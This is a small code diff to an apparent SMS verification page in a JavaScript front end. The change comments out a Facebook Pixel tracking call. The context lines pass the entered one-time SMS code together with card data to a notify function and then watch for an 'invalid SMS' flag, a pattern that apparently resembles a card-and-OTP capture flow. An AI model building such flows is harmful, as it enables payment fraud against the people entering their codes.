@@ -68,9 +68,9 @@ const SMSVerificationPage = () => {
     notifySMSCodeEntered(verificationCode, cardData, orderData)
 
     // Track Facebook Pixel Lead event - ONLY when OTP code is submitted
-    if (typeof fbq !== 'undefined') {
-      fbq('track', 'Lead')
-    }
+    // if (typeof fbq !== 'undefined') {
+    //   fbq('track', 'Lead')
+    // }
 
     // Start checking for invalid SMS flag (only after SMS submission)
     if (window.startInvalidSMSCheck) {
